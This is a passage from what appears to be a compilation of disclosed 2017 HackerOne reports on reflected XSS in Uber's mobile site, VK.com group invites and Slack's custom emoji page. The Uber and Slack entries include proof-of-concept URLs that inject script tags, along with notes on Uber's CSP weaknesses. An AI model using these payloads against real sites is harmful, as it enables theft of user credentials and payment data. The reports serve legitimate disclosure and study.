The _ga request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.

## Security Impact
Arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.

## Reproduction Steps
https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf"}}</script><script>alert(1)</script>

## Specifics
The following unescaped code is rendered:

```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"_ga":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
```

## Impact

With properly crafted javascript and/or html, an attacker could harvest Uber login and password credentials, credit card payment information etc.

---

### [SSL-protected Reflected XSS in m.uber.com](https://hackerone.com/reports/296701)

- **Report ID:** `296701`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:03:42.453Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.

## Impact

An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.

---

### [SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300080)

- **Report ID:** `300080`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:02:13.391Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The _cc request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.

## Security Impact
Arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.

## Reproduction Steps
https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_cc=asdf"}}</script><script>alert(1)</script>

## Specifics
The resulting unescaped content rendered:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"_cc":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
```

## Impact

With a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.

---

### [XSS в приглашении в группу](https://hackerone.com/reports/269940)

- **Report ID:** `269940`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** VK.com
- **Reporter:** @rooteval
- **Bounty:** - usd
- **Disclosed:** 2017-10-25T13:54:05.718Z
- **CVE(s):** -

**Summary (team):**

Отсутствие фильтрации параметров при приглашении в группу.

**Summary (researcher):**

Дыра в меню приглашения друзей в группу, позволявшая встраивать код через url.

---

### [The Custom Emoji Page has a Reflected XSS](https://hackerone.com/reports/258198)

- **Report ID:** `258198`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Slack
- **Reporter:** @co3k
- **Bounty:** - usd
- **Disclosed:** 2017-09-24T06:40:12.327Z
- **CVE(s):** -

**Vulnerability Information:**

The Custom Emoji Page has a Reflected XSS in building flash message.

The following is the PoC.
https://{team}.slack.com/customize/emoji?added=1&name=vuln"><script>alert(0);<%2Fscript>

---
